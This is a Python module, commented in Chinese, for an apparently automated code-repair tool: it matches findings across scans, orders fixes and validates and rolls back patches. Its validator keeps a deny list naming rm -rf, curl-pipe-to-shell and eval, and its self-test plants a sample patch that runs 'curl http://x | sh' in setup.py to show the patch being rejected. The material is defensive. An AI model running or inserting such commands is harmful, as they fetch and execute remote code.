"""诊疗算法核（规格 docs/code-hospital-algorithms.md）。

纯函数：不访问数据库、不改仓库。检验写入双键指纹，诊断按簇合并，
开方用拓扑序，煎药备料用 SEARCH 候选。差分、归因、逆应用、出院门禁
已在本模块，等复诊与出院阶段调用。

自检：python docs/algorithms_reference.py
"""

from __future__ import annotations

import difflib
import re
from collections import defaultdict
from collections.abc import Sequence
from dataclasses import dataclass, field

from .fingerprint import canonical_snippet, normalize_path, sha256_str
from .fingerprint import make_keys as _fp_keys

# ────────────────────────────── §1 指纹 ──────────────────────────────


@dataclass(frozen=True)
class FpKeys:
    """双键指纹：content_key 认长相（跨出现位置稳定），identity_fp 认身份。"""

    content_key: str
    identity_fp: str


def make_keys(rule_id: str, file_path: str, symbol: str, snippet: str,
              anchor: str, occurrence: int) -> FpKeys:
    content, identity = _fp_keys(rule_id, file_path, symbol, snippet, anchor, occurrence)
    return FpKeys(content_key=content, identity_fp=identity)


def similarity(a: str, b: str) -> float:
    """归一化相似度 1 - lev/max_len。用 SequenceMatcher 近似（对短片段足够）。

    autojunk=False 必须显式传：默认会把高频字符当"垃圾"忽略，短片段上直接失真。
    """
    a, b = canonical_snippet(a), canonical_snippet(b)
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a, b, autojunk=False).ratio()


def combined_similarity(p: FindingRow, c: FindingRow, w_snippet: float = 0.5) -> float:
    """片段相似度 + 内容锚相似度的加权合成（设计 §1.2 的 L1/L2 判据）。

    单看片段对短行太脆（`except: pass` 改成 `except TypeError: pass` 只有 0.71），
    掺入内容锚后，真正"同一处问题换了附近代码"会因锚不变而被顶过阈值。
    锚不可得（空串）时退化为纯片段相似度。
    """
    s = similarity(p.snippet, c.snippet)
    if not p.anchor or not c.anchor:
        return s
    w = w_snippet
    return w * s + (1 - w) * similarity(p.anchor, c.anchor)


# ────────────────────── §1.4 / §2 差分匹配 ──────────────────────


@dataclass
class FindingRow:
    """差分所需的最小字段（对应 findings 表的相关列）。"""

    rule_id: str
    file_path: str
    symbol: str
    snippet: str
    line_start: int
    anchor: str = ""
    content_key: str = ""
    identity_fp: str = ""
    payload: dict = field(default_factory=dict)

    def __post_init__(self) -> None:
        if not self.content_key:
            k = make_keys(self.rule_id, self.file_path, self.symbol, self.snippet, self.anchor, 0)
            self.content_key = k.content_key
            self.identity_fp = k.identity_fp


def annotate_occurrence(rows: Sequence[FindingRow]) -> None:
    """按 content_key 分组、以 (path, line) 排序补 occurrence，再重算 identity_fp。"""
    groups: dict[str, list[FindingRow]] = defaultdict(list)
    for r in rows:
        groups[r.content_key].append(r)
    for members in groups.values():
        members.sort(key=lambda r: (normalize_path(r.file_path), r.line_start))
        for occ, r in enumerate(members):
            r.identity_fp = make_keys(
                r.rule_id, r.file_path, r.symbol, r.snippet, r.anchor, occ
            ).identity_fp


def stamp_findings(findings: Sequence) -> None:
    """给一批 Finding 写入 content_key 与含 occurrence 的 identity 指纹。入库前调用。"""
    rows = [
        FindingRow(
            rule_id=f.rule_id,
            file_path=f.file_path,
            symbol=getattr(f, "symbol", "") or "",
            snippet=getattr(f, "evidence", "") or "",
            line_start=f.line_start,
            anchor=getattr(f, "context_anchor", "") or "",
        )
        for f in findings
    ]
    annotate_occurrence(rows)
    for finding, row in zip(findings, rows):
        finding.content_key = row.content_key
        finding.fingerprint = row.identity_fp


def lookup_history(history: dict, fingerprint: str, content_key: str, limit: int = 3) -> list:
    """调档优先用 content_key（长相），再用 identity。同一历史病例只保留一条。"""
    out: list = []
    seen: set[str] = set()
    for key in (content_key, fingerprint):
        if not key:
            continue
        for ref in history.get(key, []):
            case_id = ref.get("case_id", "")
            if case_id in seen:
                continue
            seen.add(case_id)
            out.append(ref)
            if len(out) >= limit:
                return out
    return out


@dataclass
class MatchPair:
    prev: FindingRow
    curr: FindingRow
    level: str  # exact | fuzzy | displaced | ambiguous


@dataclass
class DiffResult:
    matched: list[MatchPair] = field(default_factory=list)
    resolved: list[FindingRow] = field(default_factory=list)
    possibly_resolved: list[FindingRow] = field(default_factory=list)
    added: list[FindingRow] = field(default_factory=list)

    def counts(self) -> dict:
        return {
            "matched": len(self.matched),
            "resolved": len(self.resolved),
            "possibly_resolved": len(self.possibly_resolved),
            "added": len(self.added),
        }


DEFAULT_THETA = 0.85
DEFAULT_THETA_LOW = 0.70
MIN_SNIPPET_LEN = 12
MAX_LINE_DRIFT = 3


def match_findings(
    prev: Sequence[FindingRow],
    curr: Sequence[FindingRow],
    theta: float = DEFAULT_THETA,
    theta_low: float = DEFAULT_THETA_LOW,
) -> DiffResult:
    """三层匹配：exact → fuzzy/displaced → 不匹配。见设计 §1.4。"""
    annotate_occurrence(list(prev))
    annotate_occurrence(list(curr))

    pool = list(prev)
    paired_prev: set[int] = set()
    paired_curr: set[int] = set()
    result = DiffResult()

    # Pass 1：exact（identity 哈希，O(n)）
    by_identity: dict[str, int] = {}
    for i, p in enumerate(pool):
        by_identity.setdefault(p.identity_fp, i)
    for j, c in enumerate(curr):
        i = by_identity.get(c.identity_fp)
        if i is not None and i not in paired_prev:
            paired_prev.add(i)
            paired_curr.add(j)
            result.matched.append(MatchPair(pool[i], c, "exact"))

    # Pass 2：fuzzy / displaced，仅在同 (rule, path, symbol) 桶内，取最相似的一条。
    #
    # 两个判定细节（都是踩过坑得出的）：
    # ① snippet 相同但身份不同的复制粘贴问题**不做 fuzzy 互配**——一旦互配，「修好一处」
    #    会被错判成「另一处也治好了」。它们交给 Pass 1 的 occurrence 序号天然区分；
    # ② 相似度里必须掺入内容锚（前后各 2 行）。裸片段相似度对短行极不可靠：`except: pass`
    #    → `except TypeError: pass` 只有 0.71，落在灰区会被判成"疑似治好"而不是"已治好"。
    #    长度归一化后的锚相似度（0.81 同权重合成）能把真正改动的那一处顶过阈值。
    buckets: dict[tuple[str, str, str], list[int]] = defaultdict(list)
    for i, p in enumerate(pool):
        if i not in paired_prev:
            buckets[(p.rule_id, normalize_path(p.file_path), p.symbol)].append(i)

    for j, c in enumerate(curr):
        if j in paired_curr or len(canonical_snippet(c.snippet)) < MIN_SNIPPET_LEN:
            continue
        key = (c.rule_id, normalize_path(c.file_path), c.symbol)
        c_canon = canonical_snippet(c.snippet)
        locked_i, locked_sim = -1, 0.0
        best_i, best_sim = -1, 0.0
        for i in buckets.get(key, []):
            if canonical_snippet(pool[i].snippet) == c_canon:
                locked_i, locked_sim = i, 1.0
                break
            s = combined_similarity(pool[i], c)
            if s > best_sim:
                best_i, best_sim = i, s
        if locked_i >= 0:
            best_i, best_sim = locked_i, locked_sim
            level_ok = True
        else:
            level_ok = False
        if best_i < 0 or best_sim < theta_low:
            continue
        drift = abs(pool[best_i].line_start - c.line_start)
        if best_sim >= theta:
            level = "exact_shape" if level_ok else ("fuzzy" if drift <= MAX_LINE_DRIFT else "displaced")
            paired_prev.add(best_i)
            paired_curr.add(j)
            result.matched.append(MatchPair(pool[best_i], c, level))
        elif not c.symbol:
            # 无符号指纹才允许灰区判疑似（有符号时应靠 exact 命中，不宜放宽）
            paired_prev.add(best_i)
            paired_curr.add(j)
            result.matched.append(MatchPair(pool[best_i], c, "ambiguous"))
            result.possibly_resolved.append(pool[best_i])

    # Pass 3：剩余
    for i, p in enumerate(pool):
        if i not in paired_prev and p not in result.possibly_resolved:
            result.resolved.append(p)
    result.added = [c for j, c in enumerate(curr) if j not in paired_curr]
    return result


def match_level_of(result: DiffResult, fp: str) -> str:
    """报告用：某条 prev finding 被判 resolved 时，是靠哪级匹配判定的。"""
    for pair in result.matched:
        if pair.prev.identity_fp == fp:
            return pair.level
    return "none"


# ────────────────────── §3 医源性归因 ──────────────────────

DEFAULT_NEIGHBOR_WINDOW = 5


def _span_gap(a: tuple[int, int], b: tuple[int, int]) -> int:
    """两个闭区间的行距离（相交为 0）。"""
    if a[0] <= b[1] and b[0] <= a[1]:
        return 0
    return min(abs(a[0] - b[1]), abs(b[0] - a[1]))


def attribute_new_findings(
    added: Sequence[FindingRow],
    footprint: dict[str, list[tuple[int, int]]],
    touched_symbols: dict[str, set[str]] | None = None,
    window: int = DEFAULT_NEIGHBOR_WINDOW,
) -> dict[str, list[tuple[FindingRow, str]]]:
    """按 R1..R5 五级归因。返回 {"new_related": [(row, level)], "new_unrelated": [...]}。"""
    touched_symbols = touched_symbols or {}
    related: list[tuple[FindingRow, str]] = []
    unrelated: list[tuple[FindingRow, str]] = []

    for f in added:
        path = normalize_path(f.file_path)
        spans = footprint.get(path)
        if not spans:
            unrelated.append((f, "R5"))  # 文件未被触及
            continue
        own = (f.line_start, f.line_start)
        if any(_span_gap(own, s) == 0 for s in spans):
            related.append((f, "R1"))  # 改动行内
            continue
        if any(_span_gap(own, s) <= window for s in spans):
            related.append((f, "R2"))  # 邻域波及
            continue
        if f.symbol and f.symbol in touched_symbols.get(path, set()):
            related.append((f, "R3"))  # 同符号内
            continue
        unrelated.append((f, "R4"))  # 同文件但归因不足
    return {"new_related": related, "new_unrelated": unrelated}


def footprint_from_unified_diff(diff_text: str) -> dict[str, list[tuple[int, int]]]:
    """从 unified diff 解析改动行区间（新文件行号）。逆应用清单也复用此结构。"""
    fp: dict[str, list[tuple[int, int]]] = {}
    cur: str | None = None
    new_line = 0
    span_start: int | None = None

    def flush() -> None:
        nonlocal span_start
        if cur is not None and span_start is not None:
            fp.setdefault(cur, []).append((span_start, new_line - 1))
        span_start = None

    for line in diff_text.splitlines():
        if line.startswith("+++ "):
            flush()
            cur = line[4:].strip()
            cur = cur[2:] if cur.startswith("b/") else cur
            continue
        if line.startswith("@@"):
            flush()
            m = re.search(r"\+(\d+)", line)
            new_line = int(m.group(1)) if m else new_line
            continue
        if cur is None:
            continue
        if line.startswith("+"):
            if span_start is None:
                span_start = new_line
            new_line += 1
        elif line.startswith("-"):
            if span_start is None:
                span_start = new_line
        elif line.startswith(" "):
            flush()
            new_line += 1
    flush()
    return fp


# ────────────────────── §6 处方排序（拓扑） ──────────────────────

METHOD_RANK = {"autofix": 0, "llm_patch": 1, "manual": 2}
RISK_RANK = {"low": 0, "medium": 1, "high": 2}
SEVERITY_RANK = {"critical": 0, "major": 1, "minor": 2, "nit": 3, "info": 4}


def _same_file(a: dict, b: dict) -> bool:
    return bool(set(a.get("files", [])) & set(b.get("files", [])))


def order_prescription_items(items: Sequence[dict]) -> list[dict]:
    """带约束的拓扑排序（Kahn + 优先队列）。

    item 需含：id / method / risk / files[] / symbols[] / severity / seq_hint。
    边：E1 同文件按 seq_hint 串行；E2 同文件成药先于煎药；E3 符号依赖。
    成环时丢弃 E3 重试，再不行退化为按文件分组 + seq_hint 稳定排序。
    """
    import heapq

    def build_edges(drop_e3: bool) -> dict[str, set[str]]:
        edges: dict[str, set[str]] = {it["id"]: set() for it in items}
        by_id = {it["id"]: it for it in items}
        for a in items:
            for b in items:
                if a is b:
                    continue
                if _same_file(a, b):
                    if a.get("seq_hint", 0) < b.get("seq_hint", 0):
                        edges[b["id"]].add(a["id"])            # E1
                    if a["method"] == "autofix" and b["method"] == "llm_patch":
                        edges[b["id"]].add(a["id"])            # E2
                if not drop_e3:
                    a_syms, b_syms = set(a.get("symbols", [])), set(b.get("symbols", []))
                    if a_syms & b_syms and a.get("method") == "autofix":
                        edges[b["id"]].add(a["id"])            # E3
        del by_id
        return edges

    def kahn(edges: dict[str, set[str]]) -> list[dict] | None:
        indeg = {k: len(v) for k, v in edges.items()}
        children: dict[str, list[str]] = defaultdict(list)
        for node, parents in edges.items():
            for p in parents:
                children[p].append(node)
        by_id = {it["id"]: it for it in items}
        key = lambda i: (METHOD_RANK.get(by_id[i]["method"], 9),
                         SEVERITY_RANK.get(by_id[i].get("severity", "info"), 9),
                         by_id[i].get("seq_hint", 0))
        heap = [(key(i), i) for i, d in indeg.items() if d == 0]
        heapq.heapify(heap)
        out: list[dict] = []
        while heap:
            _, node = heapq.heappop(heap)
            out.append(by_id[node])
            for ch in children[node]:
                indeg[ch] -= 1
                if indeg[ch] == 0:
                    heapq.heappush(heap, (key(ch), ch))
        return out if len(out) == len(items) else None

    for drop_e3 in (False, True):
        res = kahn(build_edges(drop_e3))
        if res is not None:
            return res
    # 兜底：文件分组 + seq_hint（E1/E2 天然无环，理论到不了这里）
    return sorted(items, key=lambda it: (tuple(it.get("files", [])),
                                         METHOD_RANK.get(it["method"], 9),
                                         it.get("seq_hint", 0)))


# ────────────────────── §7.1 SEARCH 候选生成 ──────────────────────


def _count_block(lines: Sequence[str], block: Sequence[str]) -> int:
    """按行序列计数连续出现次数（忽略行尾空白）。"""
    nb = [ln.rstrip() for ln in block]
    nl = [ln.rstrip() for ln in lines]
    k = len(nb)
    if k == 0:
        return 0
    hits = 0
    for i in range(len(nl) - k + 1):
        if nl[i: i + k] == nb:
            hits += 1
    return hits


def gen_search_candidates(
    file_lines: Sequence[str], focus_line: int, max_candidates: int = 3
) -> list[dict]:
    """药师备料：从精确行出发按几何序扩张窗口，产出已验证唯一的 SEARCH 候选。

    focus_line 为 1-based 行号。
    """
    if not file_lines:
        return []
    idx = max(0, min(focus_line - 1, len(file_lines) - 1))
    out: list[dict] = []
    for w in (0, 1, 2, 4, 8):
        s, e = max(0, idx - w), min(len(file_lines), idx + w + 1)
        block = list(file_lines[s:e])
        if not any(ln.strip() for ln in block):
            continue
        if _count_block(file_lines, block) == 1:
            out.append({
                "text": "\n".join(block),
                "window": w,
                "lines": [s + 1, e],
                "unique": True,
            })
            if len(out) >= max_candidates:
                return out
    if out:
        return out
    # 退化：上下对称扩张直到唯一（最多 20 行），仍不唯一则原文返回并标 unique=False
    for w in range(9, 21):
        s, e = max(0, idx - w), min(len(file_lines), idx + w + 1)
        block = list(file_lines[s:e])
        uniq = _count_block(file_lines, block) == 1
        if uniq:
            return [{"text": "\n".join(block), "window": w, "lines": [s + 1, e], "unique": True}]
    s, e = max(0, idx - 1), min(len(file_lines), idx + 2)
    block = list(file_lines[s:e])
    return [{"text": "\n".join(block), "window": 1, "lines": [s + 1, e],
             "unique": _count_block(file_lines, block) == 1}]


# ────────────────────── §7.4 补丁解析 ──────────────────────


@dataclass
class Hunk:
    path: str
    search: list[str]
    replace: list[str]
    line_hint: int = 0


class PatchParseError(ValueError):
    pass


_SR = re.compile(r"<{5,}\s*SEARCH\s*\n(.*?)\n={5,}\s*\n(.*?)\n>{5,}\s*REPLACE", re.S)


def parse_patch(text: str, default_path: str = "") -> list[Hunk]:
    """SEARCH/REPLACE 块 或 unified diff → 统一 Hunk 列表（后续所有校验只对 Hunk）。"""
    text = text.replace("\r\n", "\n")
    if "<<<<<<<" in text and "SEARCH" in text.upper():
        hunks: list[Hunk] = []
        for m in _SR.finditer(text):
            search = m.group(1).split("\n")
            replace = m.group(2).split("\n")
            if search == [""] and replace == [""]:
                raise PatchParseError("SEARCH/REPLACE 块均为空")
            hunks.append(Hunk(path=default_path, search=search, replace=replace))
        if not hunks:
            raise PatchParseError("存在 SEARCH 标记但未解析出完整配对块（检查 >>>>>>> REPLACE 收尾）")
        return hunks

    if "@@" in text and ("--- " in text or "+++ " in text):
        return _parse_unified(text)

    raise PatchParseError("未识别的补丁格式（需要 SEARCH/REPLACE 块或 unified diff）")


def _parse_unified(text: str) -> list[Hunk]:
    hunks: list[Hunk] = []
    lines = text.split("\n")
    path, i = "", 0
    while i < len(lines):
        ln = lines[i]
        if ln.startswith("+++ "):
            path = ln[4:].strip()
            path = path[2:] if path.startswith("b/") else path
        elif ln.startswith("@@"):
            m = re.search(r"-(\d+)(?:,\d+)? \+(\d+)(?:,\d+)?", ln)
            start = int(m.group(1)) if m else 0
            old, new = [], []
            i += 1
            while i < len(lines) and not lines[i].startswith(("@@", "--- ", "+++ ", "diff ")):
                body = lines[i]
                if body.startswith("+"):
                    new.append(body[1:])
                elif body.startswith("-"):
                    old.append(body[1:])
                elif body.startswith(" ") or body == "":
                    old.append(body[1:] if body else "")
                    new.append(body[1:] if body else "")
                i += 1
            hunks.append(Hunk(path=path, search=old, replace=new, line_hint=start))
            continue
        i += 1
    if not hunks:
        raise PatchParseError("unified diff 中未找到可用 hunk")
    return hunks


# ────────────────────── §7.2 四道校验 ──────────────────────

_FORBIDDEN_PATTERNS = [
    (r"(?i)\brm\s+-rf\b", "rm -rf"),
    (r"curl[^\n]*\|\s*(ba)?sh", "curl|sh"),
    (r"\beval\s*\(", "eval("),
    (r"(?i)(api[_-]?key|secret|token|password)\s*=\s*['\"][A-Za-z0-9_\-]{16,}['\"]", "hardcoded_secret"),
    (r"<<-?\s*['\"]?EOF", "shell heredoc"),
]
_MANIFEST_NAMES = {
    "pyproject.toml", "package.json", "package-lock.json", "go.mod", "go.sum",
    "requirements.txt", "cargo.toml", "pom.xml", "gemfile", "composer.json",
}


def forbidden_hit(text: str) -> str:
    """内容关：命中内置禁止项时返回名称，否则空串。"""
    for pattern, name in _FORBIDDEN_PATTERNS:
        if re.search(pattern, text):
            return name
    return ""


@dataclass
class CheckResult:
    ok: bool
    stage: str
    code: str = ""
    message: str = ""
    next_action: str = ""


def validate_patch(
    hunks: Sequence[Hunk],
    files: dict[str, str],
    scope_paths: Sequence[str],
    max_patch_lines: int = 500,
    allow_manifest: bool = False,
) -> CheckResult:
    """四道确定性校验：格式 → 锚点 → scope → 内容（顺序有意，见设计 §7.2）。"""
    # 1. 格式（parse_patch 已保证结构，这里查空 hunk 与规模）
    total = sum(len(h.search) + len(h.replace) for h in hunks)
    if total == 0:
        return CheckResult(False, "format", "BadArgument", "补丁为空", "重新生成补丁")
    if total > max_patch_lines:
        return CheckResult(False, "format", "Overlimit",
                           f"补丁 {total} 行，超过上限 {max_patch_lines}",
                           "拆分为多味药或收窄改动范围")

    # 2. 锚点（search 必须唯一匹配）
    for h in hunks:
        content = files.get(normalize_path(h.path))
        if content is None:
            return CheckResult(False, "anchor", "NotFound", f"目标文件不存在：{h.path}",
                               "确认 target_file 后重新取药")
        lines = content.splitlines()
        n = _count_block(lines, h.search)
        if n == 0:
            win = "\n".join(lines[max(0, h.line_hint - 3): h.line_hint + 5])[:600]
            return CheckResult(False, "anchor", "InvalidOperation",
                               f"SEARCH 块未在 {h.path} 中找到。该区域当前内容：\n{win}",
                               "按上述当前内容重写 SEARCH（不要用过时上下文）")
        if n >= 2:
            return CheckResult(False, "anchor", "InvalidOperation",
                               f"SEARCH 块在 {h.path} 匹配 {n} 处，不唯一",
                               "扩大 SEARCH 块纳入上下文行使其唯一")

    # 3. scope
    allowed = {normalize_path(p) for p in scope_paths}
    for h in hunks:
        p = normalize_path(h.path)
        if p not in allowed:
            return CheckResult(False, "scope", "Forbidden",
                               f"hunk 目标 {p} 不在处方范围 {sorted(allowed)} 内",
                               "本味药不可跨文件；如需改动请改签处方")
        if ".hospital" in p.split("/"):
            return CheckResult(False, "scope", "Forbidden", f"禁止改动病历目录：{p}",
                               "病历不可篡改")

    # 4. 内容
    for h in hunks:
        body = "\n".join(h.replace)
        for pattern, name in _FORBIDDEN_PATTERNS:
            if re.search(pattern, body):
                return CheckResult(False, "content", "Forbidden",
                                   f"命中禁止项：{name}", "改写为安全等价实现后重试")
        fname = normalize_path(h.path).rsplit("/", 1)[-1].lower()
        if fname in _MANIFEST_NAMES and not allow_manifest:
            return CheckResult(False, "content", "Forbidden",
                               f"未声明的依赖清单改动：{h.path}",
                               "依赖变更须走高危审批（改签处方并真人确认）")
    return CheckResult(True, "all")


def apply_hunks(files: dict[str, str], hunks: Sequence[Hunk]) -> dict[str, str]:
    """正应用（假定已过校验）。返回新文件内容映射，不落盘。

    用 split("\\n") 而非 splitlines()：后者会吃掉结尾换行，往返后文件末尾少一个 \\n，
    造成"逆应用成功但内容不完全等于原文"的假阳性——回滚必须字节级可验证。
    """
    out = dict(files)
    for h in hunks:
        p = normalize_path(h.path)
        lines = out[p].split("\n")
        idx = _find_block(lines, h.search)
        if idx < 0:
            raise PatchParseError(f"应用失败：{p} 中找不到 SEARCH 块")
        out[p] = "\n".join(lines[:idx] + h.replace + lines[idx + len(h.search):])
    return out


def _find_block(lines: Sequence[str], block: Sequence[str]) -> int:
    nb = [ln.rstrip() for ln in block]
    nl = [ln.rstrip() for ln in lines]
    k = len(nb)
    for i in range(len(nl) - k + 1):
        if nl[i: i + k] == nb:
            return i
    return -1


# ────────────────────── §8 最小逆应用 ──────────────────────


@dataclass
class RollbackResult:
    ok: bool
    files: dict[str, str]
    conflict_path: str = ""
    reason: str = ""


def reverse_apply(files: dict[str, str], hunks: Sequence[Hunk]) -> RollbackResult:
    """逆应用回滚：hunk 逆序、逐块 reverse，冲突即挂起（绝不 checkout）。"""
    out = dict(files)
    by_path: dict[str, list[Hunk]] = defaultdict(list)
    for h in hunks:
        by_path[normalize_path(h.path)].append(h)
    for path, hs in by_path.items():
        if path not in out:
            return RollbackResult(False, out, path, "目标文件已不存在")
        lines = out[path].split("\n")
        for h in sorted(hs, key=lambda x: x.line_hint, reverse=True):
            idx = _find_block(lines, h.replace)
            if idx >= 0 and _count_block(lines, h.replace) == 1:
                lines = lines[:idx] + h.search + lines[idx + len(h.replace):]
            elif _count_block(lines, h.search) == 1:
                continue  # 该块已是回滚后状态（幂等）
            else:
                return RollbackResult(False, out, path,
                                      "replace 区块被改动，无法定位逆替换锚点")
        out[path] = "\n".join(lines)
    return RollbackResult(True, out)


# ────────────────────── §9 门禁合成 ──────────────────────

GATE_LEVELS = ("strict", "standard", "lax")
HARD_BY_LEVEL = {
    "strict": {"effect", "health_all", "acceptance", "archive"},
    "standard": {"effect", "health_critical", "acceptance", "archive"},
    "lax": {"effect"},
}


@dataclass
class Check:
    name: str
    verdict: str  # pass | fail | warn | skip
    detail: str = ""


def gate_verdict(checks: Sequence[Check], level: str = "standard") -> dict:
    hard = HARD_BY_LEVEL.get(level, HARD_BY_LEVEL["standard"])
    failed = [c.name for c in checks if c.name in hard and c.verdict == "fail"]
    warns = [c.name for c in checks if c.verdict == "warn"]
    return {"verdict": "pass" if not failed else "fail",
            "level": level, "failed": failed, "warns": warns}


def health_check(
    baseline: dict[tuple[str, str], int],
    current: dict[tuple[str, str], int],
    baseline_devices: set[str],
    level: str = "standard",
) -> Check:
    """全仓健康项：只比设备交集，按 (device, rule) 分组看回归。"""
    cur_dev = {d for d, _ in current}
    common = baseline_devices & cur_dev
    regressions = [
        (k, baseline.get(k, 0), v)
        for k, v in current.items()
        if k[0] in common and v > baseline.get(k, 0)
    ]
    if not regressions:
        return Check("health_all" if level == "strict" else "health_critical",
                     "pass", "设备交集内无回归")
    detail = "；".join(f"{d}/{r} {b}→{c}" for (d, r), b, c in regressions[:5])
    if level == "lax":
        return Check("health_critical", "warn", detail)
    if level == "strict" or any(r.lower().startswith("critical") or "severity:critical" in r
                                for (d, r) in [k for k, _, _ in regressions]):
        return Check("health_all" if level == "strict" else "health_critical",
                     "fail", detail)
    return Check("health_critical", "warn", detail)


def derive_outcome(
    resolved: int, total_initial: int, new_related: int, gate: dict, has_manual: bool
) -> str:
    """§9.2 outcome 派生（possibly_resolved 不计入 resolved，宁严勿宽）。"""
    if gate["verdict"] == "fail":
        return "referred" if has_manual else "unchanged"
    if new_related > 0:
        return "referred"
    if resolved > 0 and resolved >= total_initial:
        return "cured"
    if resolved > 0:
        return "improved"
    return "unchanged"


# ────────────────────── 自检 ──────────────────────


def _demo() -> None:
    print("=" * 60)
    print("§1 双键指纹 + §2 差分：复制粘贴两处同类问题，只修好第一处（带内容锚）")
    prev = [
        FindingRow("E722", "a.py", "", "except: pass", 10, anchor=sha256_str("try: a()")),
        FindingRow("E722", "a.py", "", "except: pass", 40, anchor=sha256_str("try: b()")),
    ]
    curr = [
        FindingRow("E722", "a.py", "", "except TypeError: pass", 10, anchor=sha256_str("try: a()")),
        FindingRow("E722", "a.py", "", "except: pass", 40, anchor=sha256_str("try: b()")),
    ]
    d = match_findings(prev, curr)
    expect = {"matched": 2, "resolved": 1, "possibly_resolved": 0, "added": 0}
    print("  counts:", d.counts(), "✓" if d.counts() == expect else "✗ 期望 " + str(expect))
    print("  匹配级别:", [(p.level, p.curr.line_start) for p in d.matched],
          "| resolved 行:", [r.line_start for r in d.resolved])
    print("  → 第 40 行仍在（exact），第 10 行已改（fuzzy 治好），无新增无灰区")

    print("\n§1 反向用例：修好第二处、保留第一处")
    curr_swap = [
        FindingRow("E722", "a.py", "", "except: pass", 10, anchor=sha256_str("try: a()")),
        FindingRow("E722", "a.py", "", "except KeyError: pass", 40, anchor=sha256_str("try: b()")),
    ]
    print("  counts:", match_findings(prev, curr_swap).counts())

    print("\n§1 无锚降级：锚缺失时同形态问题只能走灰区（不硬判治好，交人工）")
    p0 = [FindingRow("E722", "a.py", "", "except: pass", 10)]
    c0 = [FindingRow("E722", "a.py", "", "except TypeError: pass", 10)]
    print("  counts:", match_findings(p0, c0).counts(), "→ 期望 possibly_resolved=1")

    print("\n§1 移位鲁棒性：上方插入 import")
    prev = [FindingRow("F821", "b.py", "f", "return undefined_name", 5)]
    curr = [FindingRow("F821", "b.py", "f", "return undefined_name", 9)]
    r = match_findings(prev, curr)
    print("  counts:", r.counts(), "level:", r.matched[0].level if r.matched else "-")

    print("\n§1 真消失 + 真新增：问题被整体重写")
    prev = [FindingRow("F821", "c.py", "f", "return undefined_name", 5)]
    curr = [FindingRow("F821", "c.py", "g", "return other_missing", 5)]
    print("  counts:", match_findings(prev, curr).counts(), "→ 期望 resolved=1 added=1")

    print("\n§1 灰区：片段大改且不在同符号桶（无上下文可依）→ 只能判 resolved + added")
    prev = [FindingRow("E501", "d.py", "", "x = aaaaaaaaaa + bbbbbbbbbb + cccccccccc", 5)]
    curr = [FindingRow("E501", "d.py", "", "x = aaaaaaaaaa + zzz", 5)]
    r = match_findings(prev, curr)
    print("  counts:", r.counts(),
          f"sim={similarity(prev[0].snippet, curr[0].snippet):.2f}",
          "（sim 已跌破 θ_low=0.70，不臆测为治好）")

    print("=" * 60)
    print("§3 归因：改动 src/a.py 12-18 行，新问题在第 20 行与 src/b.py")
    fp = {"src/a.py": [(12, 18)]}
    added = [FindingRow("F841", "src/a.py", "run", "x = 1", 20),
             FindingRow("E501", "src/b.py", "", "long line", 3)]
    att = attribute_new_findings(added, fp)
    print("  related:", [(r.rule_id, lv) for r, lv in att["new_related"]])
    print("  unrelated:", [(r.rule_id, lv) for r, lv in att["new_unrelated"]])

    print("=" * 60)
    print("§6 处方排序：同文件成药必须先于煎药")
    items = [
        {"id": "i3", "method": "llm_patch", "risk": "medium", "files": ["x.py"],
         "symbols": ["f"], "severity": "major", "seq_hint": 1},
        {"id": "i1", "method": "autofix", "risk": "low", "files": ["x.py"],
         "symbols": ["f"], "severity": "minor", "seq_hint": 2},
        {"id": "i2", "method": "manual", "risk": "high", "files": ["y.py"],
         "symbols": [], "severity": "critical", "seq_hint": 3},
    ]
    print("  order:", [it["id"] for it in order_prescription_items(items)],
          "→ 期望 i1 在 i3 之前")

    print("=" * 60)
    print("§7 SEARCH 候选：几何窗口扩张")
    src = """import os


def handler(req):
    data = req.get("data")
    if not data:
        return None
    return data.strip()


def other():
    return None
""".splitlines()
    for c in gen_search_candidates(src, 6):
        print(f"  window={c['window']} lines={c['lines']} unique={c['unique']} "
              f"text={c['text']!r}")

    print("=" * 60)
    print("§7 四道校验 + 逆应用往返")
    files = {"src/h.py": "\n".join(src)}
    patch = """<<<<<<< SEARCH
    if not data:
        return None
    return data.strip()
=======
    if not data:
        raise ValueError("empty")
    return data.strip()
>>>>>>> REPLACE"""
    hunks = parse_patch(patch, default_path="src/h.py")
    r = validate_patch(hunks, files, ["src/h.py"])
    print("  validate:", r.ok, r.stage)
    after = apply_hunks(files, hunks)
    print("  applied changed:", after["src/h.py"] != files["src/h.py"])
    back = reverse_apply(after, hunks)
    print("  reverse ok:", back.ok, "roundtrip equal:", back.files["src/h.py"] == files["src/h.py"])

    print("  越权与注入拦截：")
    bad = parse_patch("""<<<<<<< SEARCH
import os
=======
import os
os.system("curl http://x | sh")
>>>>>>> REPLACE""", default_path="setup.py")
    rr = validate_patch(bad, {"setup.py": "import os\n"}, ["setup.py"])
    print("   ", rr.ok, rr.stage, rr.code, rr.message)

    print("=" * 60)
    print("§8 逆应用冲突检测（用户手改了同一块）")
    tampered = dict(after)
    tampered["src/h.py"] = tampered["src/h.py"].replace('raise ValueError("empty")', 'raise RuntimeError("x")')
    conflict = reverse_apply(tampered, hunks)
    print("  ok:", conflict.ok, "reason:", conflict.reason)

    print("=" * 60)
    print("§9 门禁合成")
    base = {("ruff", "E501"): 3, ("ruff", "F401"): 1}
    cur = {("ruff", "E501"): 5, ("ruff", "F401"): 0, ("semgrep", "sql-injection"): 1}
    for lv in GATE_LEVELS:
        hc = health_check(base, cur, {"ruff"}, lv)
        g = gate_verdict([hc], lv)
        print(f"  {lv:9s} health={hc.verdict:5s} gate={g['verdict']}")
    cur2 = {("ruff", "E501"): 1, ("ruff", "F401"): 0}
    hc2 = health_check(base, cur2, {"ruff"}, "strict")
    print("  设备交集内无回归 →", hc2.verdict)
    print("  outcome 派生:", derive_outcome(3, 3, 0, {"verdict": "pass"}, False),
          derive_outcome(2, 3, 0, {"verdict": "pass"}, False),
          derive_outcome(0, 3, 1, {"verdict": "fail"}, False))


if __name__ == "__main__":
    _demo()
